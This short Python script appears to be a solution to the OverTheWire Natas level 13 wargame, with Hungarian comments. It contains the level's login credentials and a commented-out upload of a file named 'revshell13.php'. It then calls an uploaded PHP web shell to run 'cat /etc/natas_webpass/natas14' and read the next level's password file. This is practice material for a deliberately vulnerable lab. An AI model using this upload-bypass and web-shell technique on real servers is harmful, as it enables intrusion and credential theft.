from urllib import response

#3.9 pythonnal megy!!
import urllib
import requests
import re


username = 'natas13'
password = 'lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9'

url = 'http://%s.natas.labs.overthewire.org/upload/og7hd93jrb.php?c=cat /etc/natas_webpass/natas14' % username

session = requests.Session()
#reponse = session.get(url , auth=(username, password))
#                           File feltöltés post-al                              ezeket az adatokat kell elküldeni, ez látszik a HTML kódból is
#reponse = session.post(url ,files= {"uploadedfile": open('revshell13.php','rb')}, data={ "filename": "revhell13.php", "MAX_FILESIZE": "1000" }, auth=(username, password))

#php futtatása
reponse = session.get(url , auth=(username, password))

content = reponse.text

print(content)